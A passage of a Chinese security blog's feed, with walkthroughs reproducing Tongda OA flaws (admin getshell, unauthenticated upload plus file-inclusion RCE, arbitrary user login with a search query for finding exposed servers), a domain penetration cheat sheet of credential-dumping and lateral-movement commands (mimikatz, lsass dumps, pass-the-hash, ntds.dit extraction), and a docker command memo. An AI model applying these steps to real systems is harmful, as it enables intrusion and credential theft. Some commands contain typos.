&lt;img src=&quot;../images/upload/hostnamectl.png&quot; alt=&quot;hostnamectl&quot; style=&quot;zoom:50%;&quot; /&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
  </entry>
  
  <entry>
    <title>通达OA 后台GetShell</title>
    <link href="http://yoursite.com/2020/%E9%80%9A%E8%BE%BEOA3.html"/>
    <id>http://yoursite.com/2020/%E9%80%9A%E8%BE%BEOA3.html</id>
    <published>2020-05-16T11:12:20.000Z</published>
    <updated>2020-05-16T12:53:44.582Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-如何后台"><a href="#0x01-如何后台" class="headerlink" title="0x01 如何后台"></a>0x01 如何后台</h3><p>怎么进入后台随便你，可以利用前段时间的<code>任意用户登录漏洞</code></p><p><img src="../images/upload/loginadmin.png" alt="login"></p><a id="more"></a><h3 id="0x02-更改配置"><a href="#0x02-更改配置" class="headerlink" title="0x02 更改配置"></a>0x02 更改配置</h3><p>此处利用系统管理-&gt;附件管理📎</p><p><img src="../images/upload/fujian.png" alt="fujian"></p><p>此站点并未设置存储目录，点击添加目录</p><p><img src="../images/upload/fujian2.png" alt="fujian"></p><p>目录中要设置网站根目录，根目录可以通过系统管理-&gt;系统信息处获得</p><p><img src="../images/upload/fujian3.png" alt="gujian3"></p><p><img src="../images/upload/fujian4.png" alt="fujian4"></p><p>记得勾选<code>将所有新附件存该目录</code>，然后保存</p><p><img src="../images/upload/fujian5.png" alt="fujian5"></p><h3 id="0x03-上传附件"><a href="#0x03-上传附件" class="headerlink" title="0x03 上传附件"></a>0x03 上传附件</h3><p>通过组织下的聊天框，选中自己后发送任意附件，利用BurpSuite拦截</p><p><img src="../images/upload/fujian6.png" alt="fujian6"></p><p><img src="../images/upload/oa31.png" alt="oa31"></p><p><a href="../file/upshell.txt">上传附件 request.txt</a></p><p><img src="../images/upload/oa3.png" alt="oa3"></p><p><img src="../images/upload/oa32.png" alt="oa32"></p><p><img src="../images/upload/oa33.png" alt="oa33"></p><p><img src="../images/upload/oa34.png" alt="oa34"></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-如何后台&quot;&gt;&lt;a href=&quot;#0x01-如何后台&quot; class=&quot;headerlink&quot; title=&quot;0x01 如何后台&quot;&gt;&lt;/a&gt;0x01 如何后台&lt;/h3&gt;&lt;p&gt;怎么进入后台随便你，可以利用前段时间的&lt;code&gt;任意用户登录漏洞&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/upload/loginadmin.png&quot; alt=&quot;login&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="通达OA" scheme="http://yoursite.com/categories/%E9%80%9A%E8%BE%BEOA/"/>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>通达OA 任意文件上传/文件包含GetShell</title>
    <link href="http://yoursite.com/2020/%E9%80%9A%E8%BE%BEOA2.html"/>
    <id>http://yoursite.com/2020/%E9%80%9A%E8%BE%BEOA2.html</id>
    <published>2020-05-16T06:33:06.000Z</published>
    <updated>2020-05-16T12:11:25.365Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-漏洞信息"><a href="#0x01-漏洞信息" class="headerlink" title="0x01 漏洞信息"></a>0x01 漏洞信息</h3><p>攻击者可以绕过身份认证，上传任意文件，结合文件包含漏洞即可实现RCE。<br>影响版本包含：<br>文件上传：<br><code>V11版 &lt;= 11.3    20200103 2017版 &lt;= 10.19  20190522 2016版 &lt;= 9.13   20170710 2015版 &lt;= 8.15   20160722 2013增强版 &lt;=7.25 20141211 2013版 &lt;= 6.20   20141017</code><a id="more"></a></p><p>文件包含：</p><p><code>V11版 &lt;= 11.3</code></p><h3 id="0x02-解密工具"><a href="#0x02-解密工具" class="headerlink" title="0x02 解密工具"></a>0x02 解密工具</h3><p>代码通过Zend加密处理，需对进行解密操作后获得可读性源码</p><ul><li>离线解密：<code>链接: https://pan.baidu.com/s/1MHtt3KXVIZAALzZmzTUJeg 密码: tadp</code></li><li>在线解密：<code>http://dezend.qiling.org/free.html</code></li></ul><p><a href="https://github.com/jas502n/OA-tongda-RCE/tree/master/tongda/decode" target="_blank" rel="noopener">解密后的部分代码</a></p><h3 id="0x03-漏洞成因"><a href="#0x03-漏洞成因" class="headerlink" title="0x03 漏洞成因"></a>0x03 漏洞成因</h3><ul><li>漏洞主要两个原因，文件上传、文件包含</li></ul><p><strong>文件上传</strong></p><p>ispirit/im/upload.php<br>要上传先要绕过登录认证，但在upload.php修复前，如果变量<code>$P</code>非空则不经过auth.php验证即可执行后续代码</p><p><img src="../images/upload/comper.png" alt="代码对比"></p><p>上传后的文件不在根目录，所以无法直接利用，需结合文件包含</p><p><strong>文件包含</strong></p><p>ispirit/interface/gateway.php<br>这里问题在于可以构造json，使其执行<code>include_once</code>代码</p><p><img src="../images/upload/sour.png" alt="include"></p><h3 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h3><p>1.上传文件请求</p><p><img src="../images/upload/upim.jpg" alt="upload"></p><p><a href="../file/upload.txt">命令执行request.txt</a>    <a href="../file/getshell.txt">GetWebshell request.txt</a></p><p>2.包含文件执行命令</p><p><img src="../images/upload/exec.jpg" alt="exec"></p><p><a href="../file/exec.txt">执行命令 request.txt</a></p><h3 id="0x05-异常处理"><a href="#0x05-异常处理" class="headerlink" title="0x05 异常处理"></a>0x05 异常处理</h3><ul><li><strong>版本路径</strong>：</li></ul><p>有些版本gateway.php路径不同</p><p>例如2013：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;ispirit&#x2F;im&#x2F;upload.php</span><br><span class="line">&#x2F;ispirit&#x2F;interface&#x2F;gateway.php</span><br></pre></td></tr></table></figure><p><strong>例如2017：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;ispirit&#x2F;im&#x2F;upload.php</span><br><span class="line">&#x2F;mac&#x2F;gateway.php</span><br><span class="line"></span><br><span class="line">C:\MYOA&gt;dir &#x2F;s &#x2F;b gateway.php</span><br><span class="line">C:\MYOA\webroot\mac\gateway.php</span><br></pre></td></tr></table></figure><ul><li><strong>上传后无回显：</strong></li></ul><p><img src="../images/upload/noecho.png" alt="noecho"></p><p>部分网站无上传回显，把UPLOAD_MODE参数的值改为1就可以正常拿到上传后的文件名了。</p><p><img src="../images/upload/noecho2.png" alt="noecho2"></p><ul><li><strong>为什么你没成功：</strong></li></ul><p>我试了许多版本，发现返回<code>2005_xxxxxx</code>的都不能成功，网上复现利用成功的都是<code>2003_xxxxxx</code><br>不知道怎么搞</p><hr><p><a href="https://github.com/jas502n/OA-tongda-RCE" target="_blank" rel="noopener">参考链接🔗</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-漏洞信息&quot;&gt;&lt;a href=&quot;#0x01-漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞信息&quot;&gt;&lt;/a&gt;0x01 漏洞信息&lt;/h3&gt;&lt;p&gt;攻击者可以绕过身份认证，上传任意文件，结合文件包含漏洞即可实现RCE。&lt;br&gt;影响版本包含：&lt;br&gt;文件上传：&lt;br&gt;&lt;code&gt;V11版 &amp;lt;= 11.3    20200103
 2017版 &amp;lt;= 10.19  20190522
 2016版 &amp;lt;= 9.13   20170710
 2015版 &amp;lt;= 8.15   20160722
 2013增强版 &amp;lt;=7.25 20141211
 2013版 &amp;lt;= 6.20   20141017&lt;/code&gt;
    
    </summary>
    
    
      <category term="通达OA" scheme="http://yoursite.com/categories/%E9%80%9A%E8%BE%BEOA/"/>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>通达OA 任意用户登录漏洞复现</title>
    <link href="http://yoursite.com/2020/%E9%80%9A%E8%BE%BEOA1.html"/>
    <id>http://yoursite.com/2020/%E9%80%9A%E8%BE%BEOA1.html</id>
    <published>2020-05-15T21:36:01.000Z</published>
    <updated>2020-05-16T06:36:13.357Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-漏洞信息"><a href="#0x01-漏洞信息" class="headerlink" title="0x01 漏洞信息"></a>0x01 漏洞信息</h3><p>通达OA前台任意用户登录漏洞，影响版本包括通达OA2017、V11.X&lt;V11.5；攻击者利用此漏洞可以接管服务器权限<br><img src="../images/upload/tongd.jpg" alt="OA" style="zoom: 80%;" /></p><a id="more"></a><h3 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h3><p>1.获取code_uid<br>post   /general/login_code.ph 获取code_uid</p><p><img src="../images/upload/code_uid.png" alt="example"></p><p><a href="../file/code_uid.txt">request.txt</a></p><p>2.获取sessionID<br>post  /logincheck_code.php</p><p><img src="../images/upload/sessid.jpg" alt="example"></p><p><a href="../file/sessionID.txt">requests.txt</a></p><p>3.实现登录<br>访问<a href="http://xxxx.com/general/index.php" target="_blank" rel="noopener">http://xxxx.com/general/index.php</a> 利用上一步得到的cookies，<br>通过小饼干🍪等工具替换cookie，刷新页面即可成功进入</p><p><img src="../images/upload/admin1.png" alt="example"></p><h3 id="0x03-漏洞POC"><a href="#0x03-漏洞POC" class="headerlink" title="0x03 漏洞POC"></a>0x03 漏洞POC</h3><p><a href="https://github.com/NS-Sp4ce/TongDaOA-FaKe-User" target="_blank" rel="noopener">https://github.com/NS-Sp4ce/TongDaOA-FaKe-User</a></p><p>利用POC测试站点，若存在漏洞，返回cookie；利用cookie便可直接登录</p><p><img src="../images/upload/poc1.png" alt="poc_result"></p><h3 id="0x04-关键词"><a href="#0x04-关键词" class="headerlink" title="0x04 关键词"></a>0x04 关键词</h3><p><a href="https://zoomeye.org" target="_blank" rel="noopener">https://zoomeye.org</a> 中搜索<code>app:&quot;Tongda office anywhere httpd&quot;</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-漏洞信息&quot;&gt;&lt;a href=&quot;#0x01-漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞信息&quot;&gt;&lt;/a&gt;0x01 漏洞信息&lt;/h3&gt;&lt;p&gt;通达OA前台任意用户登录漏洞，影响版本包括通达OA2017、V11.X&amp;lt;V11.5；攻击者利用此漏洞可以接管服务器权限&lt;br&gt;&lt;img src=&quot;../images/upload/tongd.jpg&quot; alt=&quot;OA&quot; style=&quot;zoom: 80%;&quot; /&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="通达OA" scheme="http://yoursite.com/categories/%E9%80%9A%E8%BE%BEOA/"/>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>域渗透知识备忘</title>
    <link href="http://yoursite.com/2020/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E5%A4%87%E5%BF%98.html"/>
    <id>http://yoursite.com/2020/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E5%A4%87%E5%BF%98.html</id>
    <published>2020-04-26T08:51:05.000Z</published>
    <updated>2021-04-14T06:13:20.539Z</updated>
    
    <content type="html"><![CDATA[<p>域渗透的一般流程：</p><p>入口主机–&gt;权限维持–&gt;横向渗透–&gt;取密码(域用户)–&gt;域信息收集–&gt;横向渗透–&gt;接管域控 </p><h3 id="一、域信息收集"><a href="#一、域信息收集" class="headerlink" title="一、域信息收集"></a>一、域信息收集</h3><p><strong>1、net</strong></p><p><code>net user /domain</code>  获取域用户列表<br><code>net group. &quot;domain admins&quot; /doamin</code>  获取域管理员列表<br><code>net group &quot;domain controllers&quot; /domain</code>  查看域控制器(如果有多台)<br><code>net group &quot;domail computers&quot; /domain</code>  查看域机器<br><code>net group /domain</code>  查询域里面的组<a id="more"></a></p><p><code>net view</code>  查看同一域内机器列表<br><code>net view \\ip</code>  查看某IP共享<br><code>net view \\GHQ</code>  查看GHQ计算机的共享资源列表<br><code>net view /domain</code>  查看内网存在多少个域<br><code>net view /domain:XYZ</code>  查看XYZ域中的机器列表</p><p><strong>2、nltest信任域</strong></p><p>查询域间的信任关系<br><code>nettles  /domain_trusts /all_trusts /v /server:192.168.52.2</code><br>返回所有信任192.168.52.2的域</p><p><code>nltest /dsgedc:XXXXX /serve:192.168.52.2</code><br>返回域控和其相应的IP地址，XXXXX是上步骤结果中的一个域</p><p>nltest的命令：<br><a href="https://www.cnblogs.com/dreamer-fish/p/3473895.html" target="_blank" rel="noopener">https://www.cnblogs.com/dreamer-fish/p/3473895.html</a></p><p><strong>3、nbtscan.exe</strong></p><p>扫描网段内是否存在域内机器</p><p><code>nbtscan.exe 192.168.52.0/24</code></p><p><strong>4、csvde</strong></p><p>csvde是windows server 2008的内置命令行工具，如果安装了AD DS或Active Directory轻型目录服务，则功能可用<br><code>csvde -setspn hack -f c:\windows\temp\hack.csv</code><br>LDAP的存储规则：<br>区分名(DN)：一个条目的区分名叫做‘dn’，在一个目录中这个名称总是唯一的<br>CN=Common Name为用户名或服务器名，最长可以到80个字符，可以为中文<br>OU=Organization Unit为组织单元，最多可以有四级，每级最长32个字符，可以为中文<br>O=Organization 为组织名，可以3-64个字符长<br>C=Country为国家名，可选，为2个字符长</p><p><strong>5、setspn</strong></p><p><code>setspn -T 域名 -Q */*</code></p><ul><li>SPN官方名称即“服务主体名称”，本质上存的是域内各种服务资源的对应关系</li><li>如，对应的服务类型是什么，机器名是什么，服务端口是多少</li><li>借助SPN可以快速定位当前目标域中所有存活的各类服务器</li></ul><p>例如查找mssql服务器<br><code>setspn -T 域名 -Q */* | findstr MSSQL</code></p><p><strong>6、dnsdump.exe</strong></p><p>获取域名其对应的IP地址<br><code>dnsdump.exe -u 域名/域用户 -p 域密码 域控机器名 -r</code></p><h3 id="二、域渗透思路"><a href="#二、域渗透思路" class="headerlink" title="二、域渗透思路"></a>二、域渗透思路</h3><h4 id="2-1、注册表读取密码-本地"><a href="#2-1、注册表读取密码-本地" class="headerlink" title="2.1、注册表读取密码-本地"></a>2.1、注册表读取密码-本地</h4><p>​    <strong>1、获取注册表信息</strong>：<br><code>reg save HKLM\SYSTEM c:\windows\temp\Sys.hiv</code><br><code>reg save HKLM\SAM c:\windows\temp\Sam.hiv</code></p><p>​    <strong>2、mimikatz解密</strong><br><code>lsadump::sam /sam:Sam.hiv /system:Sys.hiv</code></p><h4 id="2-2、lsass进程读取内存hash"><a href="#2-2、lsass进程读取内存hash" class="headerlink" title="2.2、lsass进程读取内存hash"></a>2.2、lsass进程读取内存hash</h4><p>windows 03和08中明文存储账号密码；12和16中加密为hash值</p><p>​    <strong>1、目标机执行procdump.exe</strong><br><code>procdump.exe -accepteula -ma lsass.exe c:\windows\temp\lsass.dmp</code></p><p>​    <strong>2、mimikatz中运行,结果保存在日志里</strong><br><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</code></p><h4 id="2-3、LaZagne取各种连接工具密码，浏览器保存密码等"><a href="#2-3、LaZagne取各种连接工具密码，浏览器保存密码等" class="headerlink" title="2.3、LaZagne取各种连接工具密码，浏览器保存密码等"></a>2.3、LaZagne取各种连接工具密码，浏览器保存密码等</h4><p><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></p><h4 id="2-4、凭证窃取"><a href="#2-4、凭证窃取" class="headerlink" title="2.4、凭证窃取"></a>2.4、凭证窃取</h4><p>通过tasklist /v查看进程用户，如果有域用户开启的进程，则窃取凭证</p><p><code>incognito.exe list_tokens -u</code>  查看目标机当前存储那些凭证<br><code>incognito.exe execute -c &quot;HACK\Administrator&quot; cmd.exe</code>  使用域用户administrator凭证开启一个cmd</p><h4 id="2-5、命令行渗透-IPC连接"><a href="#2-5、命令行渗透-IPC连接" class="headerlink" title="2.5、命令行渗透-IPC连接"></a>2.5、命令行渗透-IPC连接</h4><p>为什么命令后渗透？？<br>1、远程登录桌面增加暴漏风险<br>2、目标管理员可能对服务器禁用远程登录</p><ul><li>建立ipc连接<br>可以访问目标机器的文件(上传、下载)，也可以在目标机器上运行命令上传和下载文件直接通过copy命令就可以，<br>不过路径换成UNC路径。以\开头的路径就是UNC路径，比如\192.168.1.1\c$\users</li></ul><p><code>net use \\192.168.1.1 /u:域\域用户名 域用户密码</code><br>例如：<code>net use \\192.168.1.1 /u:hack\administrator  1q2w3</code></p><ul><li><p>第二步：上传/下载文件<br>例如：从本地上传1.bat到192.168.1.1机器C盘根目录下<br><code>copy 1.bat \\192.168.1.1\C$\</code></p><p>dir、copy、xcopy、move、type的参数都可以使用UNC路径</p></li></ul><h4 id="2-6、命令行渗透-计划任务执行命令"><a href="#2-6、命令行渗透-计划任务执行命令" class="headerlink" title="2.6、命令行渗透-计划任务执行命令"></a>2.6、命令行渗透-计划任务执行命令</h4><ul><li><p>创建计划任务<br><code>schtasks /create /tn 任务名 /U 域\域用户 /P 域用户密码 /tr 执行的命令或者bat路径 /sc ONSTART /s 域机器IP /RU system</code></p></li><li><p>执行计划任务</p><p><code>schtasks /run /tn 任务名 /s 域机器IP /U 域\域用户 -P 域用户密码</code></p></li><li><p>删除计划任务</p><p><code>schtasks /F /delete /tn 任务名 /s 域机器IP /U 域\域用户 /P 域用户密码</code></p></li></ul><p>例如：在192.168.1.1上建立task1任务（以system权限执行cmd程序）<br><code>schtasks /create /tn task1 /U hack\administrator /P 1q2w3e -tr &quot;c:\windows\system32\cms.exe /c whoami &gt; c:\\windows\\temp\\1.txt&quot; /sc ONSTART /s 192.168.1.1 /RU system</code></p><h4 id="2-7、命令行渗透-psexec-exe"><a href="#2-7、命令行渗透-psexec-exe" class="headerlink" title="2.7、命令行渗透-psexec.exe"></a>2.7、命令行渗透-psexec.exe</h4><p><strong>知道域账号密码</strong></p><ul><li><p>建立IPC连接</p><p><code>net use \\192.168.1.1 /u:域\域用户名 域用户密码</code></p></li><li><p>执行命令</p><p><code>psexec.exe \\192.168.1.1 -s cmd.exe -accepteula</code><br>-accepteula第一次运行回弹框，输入这个参数便不会弹框；-s 以“nt authority\system”权限运行远程进程</p></li></ul><p><strong>不知明文域账号密码，hash传递</strong></p><p><code>psexec_hash.exe -hashes :用户hash 域名\用户名@目标IP</code></p><h4 id="2-8、获取内网代理"><a href="#2-8、获取内网代理" class="headerlink" title="2.8、获取内网代理"></a>2.8、获取内网代理</h4><p>内网中有些资源可能需要挂指定<code>代理</code>才能进行访问，一般是<code>IE</code>代理或<code>PAC</code>代理，这两个代理可以通过注册表来读取。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer</span><br><span class="line">reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoConfigURL</span><br></pre></td></tr></table></figure><h3 id="三、Windows-api-利用"><a href="#三、Windows-api-利用" class="headerlink" title="三、Windows api 利用"></a>三、Windows api 利用</h3><p>以下所有利用工具的前提都是已经<code>建立IPC连接</code></p><table><thead><tr><th align="left">工具名称</th><th align="left">功能</th></tr></thead><tbody><tr><td align="left">NetGroupGetUsers.exe</td><td align="left">查询域里的各个组里的成员，IP必须是域控IP，域用户随意</td></tr><tr><td align="left">NetLocalGroupGetMembers.exe</td><td align="left">查询目标服务器本地管理组的成员</td></tr><tr><td align="left">NetUserEnum.exe</td><td align="left">查询目标服务器所有用户，包括隐藏用户</td></tr></tbody></table><p>命令用法如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NetGroupGetUsers.exe "domain users" \\192.168.52.2</span><br><span class="line">NetLocalGroupGetMembers.exe \\192.168.52.2</span><br><span class="line">NetUserEnum.exe \\192.168.52.2</span><br></pre></td></tr></table></figure><h3 id="四、导域HASH"><a href="#四、导域HASH" class="headerlink" title="四、导域HASH"></a>四、导域HASH</h3><p>拿下域控之后，我们可以通过导出域hash将所有域用户的密码取出。</p><p><code>Windows</code>的密码是经过<code>hash</code>后存储的，本地存放在<code>hklm\sam</code>以及<code>hklm\system</code>注册表中，域里面是存放在域控制器的<code>c:\windows\ntds\ntds.dit</code>中。<br><code>ntds.dit</code>其实就是个<code>esent</code>数据库，微软本身就有一系列文档化的<code>api</code>能够操作这个数据库：<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/gg294074.aspx" target="_blank" rel="noopener">官方文档</a>，首先我们要创建一个快照：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot "activate instance ntds" creat quit quit</span><br></pre></td></tr></table></figure><p>接下来我们挂载快照：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot "mount &#123;快照id&#125;" quit quit</span><br></pre></td></tr></table></figure><p>接下来我们复制<code>ntds.dit</code>到本地：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 装载位置\windows\NTDS\ntds.dit C:\ntds.dit</span><br></pre></td></tr></table></figure><p>接下来我们解除挂载：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot "unmount &#123;快照id&#125;" quit quit</span><br></pre></td></tr></table></figure><p>最后删除快照：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot "delete &#123;快照id&#125;" quit quit</span><br></pre></td></tr></table></figure><p>接下来我们就可以开始解密了，首先通过注册表的方式获取<code>KEY</code>，再用<code>NTDSDumpEx</code>获取所有域用户hash：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM c:\windows\temp\sys.hiv</span><br><span class="line">NTDSDdumpEx.exe -d ntds.dit -o hash.txt -s sys.hiv -h</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;域渗透的一般流程：&lt;/p&gt;
&lt;p&gt;入口主机–&amp;gt;权限维持–&amp;gt;横向渗透–&amp;gt;取密码(域用户)–&amp;gt;域信息收集–&amp;gt;横向渗透–&amp;gt;接管域控 &lt;/p&gt;
&lt;h3 id=&quot;一、域信息收集&quot;&gt;&lt;a href=&quot;#一、域信息收集&quot; class=&quot;headerlink&quot; title=&quot;一、域信息收集&quot;&gt;&lt;/a&gt;一、域信息收集&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;1、net&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;net user /domain&lt;/code&gt;  获取域用户列表&lt;br&gt;&lt;code&gt;net group. &amp;quot;domain admins&amp;quot; /doamin&lt;/code&gt;  获取域管理员列表&lt;br&gt;&lt;code&gt;net group &amp;quot;domain controllers&amp;quot; /domain&lt;/code&gt;  查看域控制器(如果有多台)&lt;br&gt;&lt;code&gt;net group &amp;quot;domail computers&amp;quot; /domain&lt;/code&gt;  查看域机器&lt;br&gt;&lt;code&gt;net group /domain&lt;/code&gt;  查询域里面的组
    
    </summary>
    
    
    
      <category term="Penetration" scheme="http://yoursite.com/tags/Penetration/"/>
    
  </entry>
  
  <entry>
    <title>docker常用命令</title>
    <link href="http://yoursite.com/2020/docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4.html"/>
    <id>http://yoursite.com/2020/docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4.html</id>
    <published>2020-04-20T07:36:38.000Z</published>
    <updated>2020-04-26T08:35:07.352Z</updated>
    
    <content type="html"><![CDATA[<p><font color=green>Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 Apache2.0 协议开源，可用于开发，交付和运行应用程序的开放平台。而在安全测试中我们可以利用docker快速搭建出理想环境，进而复现测试漏洞，下面👇我整理出来一些常用命令，作为备忘。</font></p><h3 id="0、重点！重点！重点！"><a href="#0、重点！重点！重点！" class="headerlink" title="0、重点！重点！重点！"></a>0、重点！重点！重点！</h3><p>Docker三要素：<font color=red>镜像、容器、仓库</font><br>仓库：集中存放镜像文件的地方；仓库分为公开仓库和私有仓库，目前全世界最大的仓库是Docker官方的 Docker Hub<br>镜像：Docker 镜像（Image），就相当于是一个 root 文件系统。<br>容器：镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。<a id="more"></a></p><h3 id="1、帮助命令："><a href="#1、帮助命令：" class="headerlink" title="1、帮助命令："></a>1、帮助命令：</h3><ul><li>查看docker版本信息：docker  version</li><li>查看系统相关信息：docker  info</li><li>查看docker帮助文档：docker  –help</li></ul><h3 id="2、镜像命令："><a href="#2、镜像命令：" class="headerlink" title="2、镜像命令："></a>2、镜像命令：</h3><ul><li>列出本地主机的镜像：docker  images <pre><code>可选参数：      -a：所有镜像；       -q：只显示镜像ID；       --digests：显示镜像摘要信息      --no-trunc：显示完整的镜像信息</code></pre></li><li>搜索某个镜像：docker  search  镜像名 [options]<pre><code>可选参数：      --no-trunc：显示完整的镜像描述      -f：按key=value过滤结果      --limit：限制结果条数,默认25条结果</code></pre></li><li>下载某个镜像：docker  pull 镜像名[:TAG]</li><li>删除本地镜像：<pre><code>删除单个：docker  rmi  -f 镜像ID删除多个：docker  rmi -f 镜像名1:TAG 镜像名2:TAG删除全部：docker  rmi -f $(docker  images  -qa</code></pre></li></ul><h3 id="3、容器命令："><a href="#3、容器命令：" class="headerlink" title="3、容器命令："></a>3、容器命令：</h3><ul><li><p>新建并启动容器：docker  run  [options] 镜像名/imageID<br>常用options选项：</p><pre><code>--name=&quot;容器新名字&quot;：为容器指定一个名称   -d：后台运行容器，并返回容器ID-i：以交互模式运行容器，通常与-t同时使用-t：为容器重新分配一个伪输入的终端-P：随机端口映射-p：指定端口映射，有以下四种格式    ip:hostPort:containerPort    ip::containerPort    &lt;font color=red&gt;hostPort:containerPort&lt;/font&gt;    containerPort</code></pre></li><li><p>列出运行的容器：docker  ps  [options]<br>常用options选项：</p><pre><code>-a :列出当前所有正在运行的容器+历史上运行过的-l :显示最近创建的容器。-n：显示最近n个创建的容器。-q :静默模式，只显示容器编号。--no-trunc :不截断输出。</code></pre></li><li><p>退出容器：<br>exit：容器停止并退出<br>ctrl：容器不停止退出</p></li><li><p>启动容器：docker start 容器ID/容器名</p></li><li><p>重启容器：docker restart 容器ID/容器名</p></li><li><p>停止容器：docker stop 容器ID/容器名</p></li><li><p>强制停止容器：docker kill 容器ID/容器名</p></li><li><p>删除停止的容器：docker rm 容器ID<br>一次性删除多个容器：docker  rm -f $(docker ps -qa)</p></li></ul><h3 id="4、其它命令："><a href="#4、其它命令：" class="headerlink" title="4、其它命令："></a>4、其它命令：</h3><ul><li>查看容器日志：docker logs -f -t –tail 容器ID<br>-t：显示时间戳<pre><code>-f：跟随最新日志打印--tail：数字 显示最后多少条</code></pre></li><li>查看容器内运行的进程：docker top 容器ID</li><li>查看容器内详情：docker inspect 容器ID</li><li>进入正运行的容器并以命令行交互：<br>docker exec -it 容器ID /bin/bash</li><li>重新进入正运行的容器：<br>docker attach 容器ID<br><font color=red>attach：直接进入容器启动的命令终端，不会启动新的进程；<br>exec：是在容器打开新的终端，并且可以启动新的进程</font></li><li>从容器内拷贝文件到主机上：<br>docker cp 容器ID:容器内路径 目的主机路径</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;font color=green&gt;Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 Apache2.0 协议开源，可用于开发，交付和运行应用程序的开放平台。而在安全测试中我们可以利用docker快速搭建出理想环境，进而复现测试漏洞，下面👇我整理出来一些常用命令，作为备忘。&lt;/font&gt;&lt;/p&gt;
&lt;h3 id=&quot;0、重点！重点！重点！&quot;&gt;&lt;a href=&quot;#0、重点！重点！重点！&quot; class=&quot;headerlink&quot; title=&quot;0、重点！重点！重点！&quot;&gt;&lt;/a&gt;0、重点！重点！重点！&lt;/h3&gt;&lt;p&gt;Docker三要素：&lt;font color=red&gt;镜像、容器、仓库&lt;/font&gt;&lt;br&gt;仓库：集中存放镜像文件的地方；仓库分为公开仓库和私有仓库，目前全世界最大的仓库是Docker官方的 Docker Hub&lt;br&gt;镜像：Docker 镜像（Image），就相当于是一个 root 文件系统。&lt;br&gt;容器：镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>shell中文件下载方法</title>
    <link href="http://yoursite.com/2020/shell%E4%B8%8B%E8%BD%BD.html"/>
    <id>http://yoursite.com/2020/shell%E4%B8%8B%E8%BD%BD.html</id>
    <published>2020-04-04T01:59:20.000Z</published>
